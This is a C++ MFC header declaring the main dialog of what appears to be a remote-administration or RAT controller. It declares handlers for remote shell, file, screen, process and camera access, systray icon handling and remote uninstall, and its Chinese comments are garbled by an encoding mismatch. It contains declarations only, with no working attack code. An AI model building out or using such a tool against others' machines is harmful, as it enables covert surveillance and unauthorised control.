
#include "SEU_QQwry.h"
#include "IOCPServer.h"
#include "afxcmn.h"
// ServerDlg.h : ͷ�ļ�
//
#include "FileDlg.h"
#include "ShellDlg.h"
#include "ScreenDlg.h"
#include "ProcessDlg.h"
#include "SoftDlg.h"

enum
{
    Shell_Dlg = 1,
    File_Dlg,
    Screen_Dlg,
    Process_Dlg
};
#pragma once

// CServerDlg �Ի���
class CServerDlg : public CDialogEx
{
// ����
public:
	CServerDlg(CWnd* pParent = NULL);	// ��׼���캯��

// �Ի�������
	enum { IDD = IDD_SERVER_DIALOG };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);	// DDX/DDV ֧��


// ʵ��
protected:
	HICON m_hIcon;

	// ���ɵ���Ϣӳ�亯��
	virtual BOOL OnInitDialog();
	afx_msg void OnPaint();
	afx_msg HCURSOR OnQueryDragIcon();


    afx_msg void OnFileManage();
    afx_msg void OnScreen();
    afx_msg void OnProcess();
    afx_msg void OnCamera();
    afx_msg void OnShellMange();
    afx_msg void OnSoftSet();
    afx_msg void OnAboutDlg();
    afx_msg void OnExit();
	DECLARE_MESSAGE_MAP()
    //����
    afx_msg void AddSystrayIcon();
    afx_msg void DelSystrayIcon();
    //�����Լ�����Ϣ����
    virtual LRESULT WindowProc(UINT message, WPARAM wParam, LPARAM lParam);
    //�б���Ҽ�
    afx_msg void OnRclickList1(NMHDR *pNMHDR, LRESULT *pResult);
    //ʱ��
    afx_msg void OnTimer(UINT_PTR nIDEvent);
public:
    //����
    void StartServer();
    //ֹͣ
    void Stop();
    //IOCP��Ϣ�ص�������
    static void CALLBACK NotifyProc(LPVOID lpParam, tagClientContext* pContext, UINT nCode);

    //����������Ϣ
    void ProcessMessage(tagClientContext* pContext);
    //��ѡ�еķ�������
    void SelectComamndSend(char*  pBuffer, int nSize);

    CListCtrl          m_ListCtrl;
    CToolBar           m_ToolBar;
    CImageList         m_ImageList;
    CStatusBar         m_StatusBar;
    BOOL               m_bIsQQwryExist;
    SEU_QQwry*         m_QQwry;
    CTime              time;
    NOTIFYICONDATA     g_nd;//����

    CString            m_csPort;
    
    CIOCPServer*       m_IOCPServer;
    
protected:
    afx_msg LRESULT OnOpenshelldlg(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenfiledlg(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpensrceendlg(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnOpenprocessdlg(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnReplyhreat(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnAddlist(WPARAM wParam, LPARAM lParam);
    afx_msg LRESULT OnRemovelist(WPARAM wParam, LPARAM lParam);
public:
    virtual BOOL DestroyWindow();

    afx_msg void OnUninstall();
};
